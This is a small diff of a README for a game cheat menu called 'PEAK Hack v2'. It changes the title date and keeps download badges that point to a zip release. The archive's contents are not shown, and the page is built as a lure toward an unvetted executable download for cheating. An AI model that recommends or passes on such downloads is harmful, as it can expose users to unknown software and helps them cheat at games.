@@ -1,4 +1,4 @@
-# PEAK Hack v2 (Cheat menu) 28-Aug-2026
+# PEAK Hack v2 (Cheat menu) 03-Sep-2026
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/AmplitudeStarling/PEAK-Hack-v2/releases/download/v2/PEAK_v2.10.zip)
 [![GitHub release](https://img.shields.io/badge/Release-2.10-blue?style=for-the-badge)](https://github.com/AmplitudeStarling/PEAK-Hack-v2/releases/download/v2/PEAK_v2.10.zip)
